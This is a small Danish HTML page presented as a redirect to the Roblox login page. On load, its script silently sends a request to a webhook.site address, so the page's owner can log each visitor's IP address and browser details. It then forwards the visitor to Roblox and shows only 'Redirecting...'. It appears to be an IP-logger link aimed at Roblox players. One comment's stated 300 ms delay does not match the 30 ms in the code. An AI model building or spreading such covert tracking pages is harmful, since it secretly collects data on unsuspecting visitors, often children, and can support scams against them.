<!DOCTYPE html>
<html lang="da">
<head>
  <meta charset="UTF-8">
  <title>Redirect til Roblox</title>
  <script>
    window.onload = function() {
      // Send klik til Webhook.site
      fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5")
        .catch(error => console.error("Fejl:", error));

      // Redirect til Roblox næsten med det samme
      setTimeout(() => {
        window.location.href = "https://www.roblox.com/Login";
      }, 30); // 300 ms forsinkelse for at fetch kan nå at køre
    }
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
